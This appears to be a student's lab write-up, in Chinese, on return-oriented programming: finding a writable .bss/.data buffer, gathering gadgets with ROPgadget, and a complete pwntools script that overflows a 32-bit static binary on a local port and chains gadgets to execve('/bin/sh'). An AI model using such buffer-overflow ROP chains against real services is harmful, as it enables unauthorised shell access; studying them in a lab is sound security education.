# Lab5 rop

## 先備知識

### How to find the writeable buffer

.bss和.data的地方都是可以當buffer寫入的，可以用`gdb$ readelf`來確認他們的address，但因為.bss前面可能會用到，所以我們可以先用x/x <.bss address>來確認可不可以寫，如果是0x00000000的話就是沒有被用到可以寫進去

### flat([])

- 用flat()前要先指定x86或是x64，若為x86則`context.arch="i386"`
- `flat([0x1234, 0x5678])` 等於 `p32(0x1234)+p32(0x5678)`

## simple ROP

execve("/bin/sh", NULL, NULL)

1. write to memory
將"/bin/sh"字串寫入到memory中
2. write to register
eax=0xb, ebx=address of "/bin/sh", ecx=0, edx=0
3. int 0x80

## Solve

1. file <binary> 先看他是否為static linking
2. ROPgadget - -binary <binary> > dump 將gadget dump下來等等可以查看
3. 找BOF return offset → 32，並且只能再塞68bytes gadget
4. gdb$ readelf 找buffer → .bss = 0x80eaf80, .data = 0x80ea060
5. write to memory
    1. 找 mov dword ptr [reg], reg
    cat dump | grep "mov dword ptr \[edx], eax" → 0x0809a15d : mov dword ptr [edx], eax ; ret
    2. 找 pop edx
    cat dump | grep "pop edx" → 0x0806e82a : pop edx ; ret
    3. 找 pop eax
    cat dump | grep "pop eax" → 0x080bae06 : pop eax ; ret
6. write to register

    找pop edx ; pop ecx ; pop ebx ; 
    cat dump | grep "pop edx ; pop ecx ; pop ebx ;"→ 0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret

7. system call

    找int 0x80
    cat dump | grep "int 0x80" → 0x080493e1 : int 0x80

```python
from pwn import *

host = "127.0.0.1"
port = 8888
r  = remote(host, port)

context.arch = "i386" # x86
# context.log_level = "debug" # for debug mode

## bof
payload = 'a'*32 

## write to memory
buf = 0x80ea060 # .data
mov_edx_eax = 0x0809a15d
pop_edx = 0x0806e82a
pop_eax = 0x080bae06
rop = flat([pop_edx, buf, pop_eax, "/bin", mov_edx_eax])
rop += flat([pop_edx, buf+4, pop_eax, "/sh\x00", mov_edx_eax])
# print len(rop) # 40

## write to register
pop_edx_exc_ebx = 0x0806e850
rop += flat([pop_edx_exc_ebx, 0, 0, buf])
rop += flat([pop_eax, 0xb])

## system call
int_0x80 = 0x080493e1
rop += flat([int_0x80])
# print len(rop) #68

payload += rop
r.recvuntil(":")
r.sendline(payload)
r.interactive()
```
